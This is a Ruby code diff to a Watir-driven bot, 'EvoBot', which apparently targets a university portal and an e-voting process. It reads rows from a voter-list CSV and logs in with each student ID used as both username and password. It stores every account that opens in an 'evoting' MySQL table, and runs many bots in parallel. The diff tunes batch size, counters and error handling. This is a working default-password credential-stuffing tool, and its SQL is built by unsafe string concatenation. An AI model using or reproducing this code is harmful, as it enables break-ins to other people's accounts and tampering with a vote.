@@ -32,10 +32,10 @@ class EvoBot
     end
     def do_scanning(  )
         puts( "Bot id : "+ "#{@id}" + " do scanning" )
-
+        count = 0
         @browser = Watir::Browser.new :chrome
         @data.each do |row|
-            puts( "Bot id : "+ "#{@id}" + " | target : " + row[0] )
+            puts( "Bot id : "+ "#{@id}" + " | target : " + row[0] + " | index " +  "#{count}" )
             nim = row[0]
             pass = row[0]
             @browser.goto @baseUrl + "/index.php?exec=login"
@@ -43,14 +43,20 @@ class EvoBot
             @browser.text_field(:name => "password").set pass
             @browser.input(:type => "submit" ).click 
         
-            sleep(1)    
-            if @browser.table(:class => "main" ).exists?
-                query = "INSERT INTO `users` (`id`, `nim`, `pass` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}' "+ ")"
-                puts( query )
-                
-                @client.query(query)
-                @browser.link(:href => "ademik.php?logout=1" ).click
-            end
+            sleep(1)   
+            begin
+                if @browser.table(:class => "main" ).exists?
+                    query = "INSERT INTO `users` (`id`, `nim`, `pass` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}' "+ ")"
+                    puts( query )
+                    
+                    @client.query(query)
+                    @browser.link(:href => "ademik.php?logout=1" ).click
+                end
+            rescue
+                ap "Bot id : "+ "#{@id}" + " | " + "failed to save data"
+            end 
+            
+            count += 1
             sleep(2)
         end
     end
@@ -60,13 +66,13 @@ end
 # client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
 # @baseUrl = "http://192.168.0.55/"
 
-table = CSV.read("DPS PERTANIAN.csv")
+table = CSV.read("DPS PERTANIAN4.csv")
 puts( table.length )
 
 bots = []
 i = 0
 start = 0
-inc = 500
+inc = 25
 begin
     data = table[start .. ( start + inc ) ]
     bots.push(
@@ -102,4 +108,4 @@ bots.each do |bot|
     }
 
 end
-sleep(500)
+sleep(10000)
